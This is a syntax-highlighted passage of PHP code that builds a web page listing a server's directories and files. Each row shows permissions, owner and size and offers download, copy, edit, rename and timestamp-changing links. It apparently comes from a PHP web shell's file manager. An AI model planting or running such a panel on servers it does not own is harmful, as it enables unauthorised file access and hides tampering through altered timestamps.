<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'dirchmod'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getChmod(</span>$<span style="color: #ffcc66;">filepath</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'dirperm'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getPerms(</span>$<span style="color: #ffcc66;">filepath</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'fileowner'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getUser(</span>$<span style="color: #ffcc66;">filepath</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'dirlink'</span>]=$<span style="color: #ffcc66;">nowpath</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'server_link'</span>]=$<span style="color: #ffcc66;">filepath</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdata</span>[]=$<span style="color: #ffcc66;">dirdb</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {<span style="color: #f2777a; background-color: #515151;">        </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'filename'</span>]=$<span style="color: #ffcc66;">file</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'size'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">sizecount(</span>@<span style="color: #cccccc; background-color: #2d2d2d;">filesize(</span>$<span style="color: #ffcc66;">filepath</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'mtime'</span>]=<span style="color: #99cc99;">@date</span>(<span style="color: #66cccc;">'Y-m-d H:i:s'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">filemtime(</span>$<span style="color: #ffcc66;">filepath</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'filechmod'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getChmod(</span>$<span style="color: #ffcc66;">filepath</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'fileperm'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getPerms(</span>$<span style="color: #ffcc66;">filepath</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'fileowner'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getUser(</span>$<span style="color: #ffcc66;">filepath</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'dirlink'</span>]=$<span style="color: #ffcc66;">nowpath</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'server_link'</span>]=$<span style="color: #ffcc66;">filepath</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[]=$<span style="color: #ffcc66;">filedb</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">while</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">unset(</span>$<span style="color: #ffcc66;">dirdb</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">unset(</span>$<span style="color: #ffcc66;">filedb</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">closedir(</span>$<span style="color: #ffcc66;">dirs</span>);
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">sort(</span>$<span style="color: #ffcc66;">dirdata</span>);
<span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">sort(</span>$<span style="color: #ffcc66;">filedata</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dir_i</span> = <span style="color: #66cccc;">'0'</span>;

<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;form id="filelist" name="filelist" action="'</span>.$<span style="color: #ffcc66;">self</span>.<span style="color: #66cccc;">'" method="post"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'file'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'thefile'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'doing'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dir'</span>,$<span style="color: #ffcc66;">nowpath</span>);

<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span>($<span style="color: #ffcc66;">dirdata</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">key</span> =&gt; $<span style="color: #ffcc66;">dirdb</span>){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'filename'</span>]!=<span style="color: #66cccc;">'..'</span> &amp;&amp; $<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'filename'</span>]!=<span style="color: #66cccc;">'.'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">getdir</span> &amp;&amp; $<span style="color: #ffcc66;">getdir</span> == $<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'server_link'</span>]) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">attachsize</span> = <span style="color: #cccccc; background-color: #2d2d2d;">dirsize(</span>$<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'server_link'</span>]);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">attachsize</span> = <span style="color: #cccccc; background-color: #2d2d2d;">is_numeric(</span>$<span style="color: #ffcc66;">attachsize</span>) ? <span style="color: #cccccc; background-color: #2d2d2d;">sizecount(</span>$<span style="color: #ffcc66;">attachsize</span>) :<span style="text-decoration: underline;"> </span><span style="color: #66cccc; text-decoration: underline;">'Unknown'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">attachsize</span> = <span style="color: #66cccc;">'&lt;a href="javascript:getsize(\''</span>.$<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'server_li</span><span style="color: #66cccc; text-decoration: underline;">nk'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">dir</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\');"&gt;Stat&lt;/a&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">thisbg</span> = <span style="color: #cccccc; background-color: #2d2d2d;">bg(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="'</span>.$<span style="color: #ffcc66;">thisbg</span>.<span style="color: #66cccc;">'" onmouseover="this.className=\'focus\';" o</span><span style="color: #66cccc; text-decoration: underline;">nmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'"&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;&lt;a href="javascript:godir(\''</span>.$<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'server_link'</span>].<span style="color: #66cccc;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.$<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'ser</span><span style="color: #66cccc; text-decoration: underline;">ver_link'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'mtime'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td nowrap&gt;'</span>.$<span style="color: #ffcc66;">attachsize</span>.<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'server_link'</span>].<span style="color: #66cccc;">'\');"&gt;'</span>.$<span style="color: #ffcc66; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'dirchmod'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/a&gt; / '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'server_link'</span>].<span style="color: #66cccc;">'\');"&gt;'</span>.$<span style="color: #ffcc66; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'dirperm'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'fileowner'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td nowrap&gt;&lt;a href="javascript:rename(\''</span>.$<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'server_link'</span>].<span style="color: #66cccc;">'</span><span style="color: #66cccc; text-decoration: underline;">\');"&gt;Rename&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/tr&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dir_i</span>++;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">dirdb</span>[<span style="color: #66cccc;">'filename'</span>]==<span style="color: #66cccc;">'..'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class='</span>.<span style="color: #cccccc; background-color: #2d2d2d;">bg(</span>).<span style="color: #66cccc;">'&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td align="center"&gt;-&lt;/td&gt;&lt;td nowrap colspan="5"&gt;&lt;a href="java</span><span style="color: #66cccc; text-decoration: underline;">script:godir(\''</span><span style="text-decoration: underline;">.</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">getUpPath(</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">).</span><span style="color: #66cccc; text-decoration: underline;">'\');"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/tr&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px </span><span style="color: #66cccc; text-decoration: underline;">solid #ddd;"&gt;&lt;td colspan="6" height="5"&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">file_i</span> = <span style="color: #66cccc;">'0'</span>;

<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span>($<span style="color: #ffcc66;">filedata</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">key</span> =&gt; $<span style="color: #ffcc66;">filedb</span>){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'filename'</span>]!=<span style="color: #66cccc;">'..'</span> &amp;&amp; $<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'filename'</span>]!=<span style="color: #66cccc;">'.'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fileurl</span> = <span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span>$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">"DOCUMENT_ROOT"</span>],<span style="color: #66cccc;">''</span>,$<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'server_</span><span style="color: #66cccc; text-decoration: underline;">link'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">thisbg</span> = <span style="color: #cccccc; background-color: #2d2d2d;">bg(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class="'</span>.$<span style="color: #ffcc66;">thisbg</span>.<span style="color: #66cccc;">'" onmouseover="this.className=\'focus\';" o</span><span style="color: #66cccc; text-decoration: underline;">nmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'"&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.((<span style="color: #cccccc; background-color: #2d2d2d;">strpos(</span>$<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'server_link'</span>], $<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">"DOCUMENT_ROOT"</span>])<span style="text-decoration: underline;"> !== </span><span style="color: #6699cc; text-decoration: underline;">false</span><span style="text-decoration: underline;">) ? </span><span style="color: #66cccc; text-decoration: underline;">'&lt;a href="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">fileurl</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'" target="_blank"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;"> : $</span><span style="color: #ffcc66; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">]).</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.$<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'se</span><span style="color: #66cccc; text-decoration: underline;">rver_link'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'mtime'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td nowrap&gt;'</span>.$<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'size'</span>].<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'server_link'</span>].<span style="color: #66cccc;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'filechmod'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/a&gt; / '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'server_link'</span>].<span style="color: #66cccc;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'fileperm'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'fileowner'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;a href="javascript:dofile(\'downfile\',\''</span>.$<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'\');"&gt;Down&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;a href="javascript:copyfile(\''</span>.$<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'server_link'</span>].<span style="color: #66cccc;">'\');"&gt;Co</span><span style="color: #66cccc; text-decoration: underline;">py&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;a href="javascript:opfile(\'editfile\',\''</span>.$<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'\');"&gt;Edit&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;a href="javascript:rename(\''</span>.$<span style="color: #ffcc66;">filedb</span>[<span style="color: #66cccc;">'server_link'</span>].<span style="color: #66cccc;">'\');"&gt;Rena</span><span style="color: #66cccc; text-decoration: underline;">me&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">file_i</span>++;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
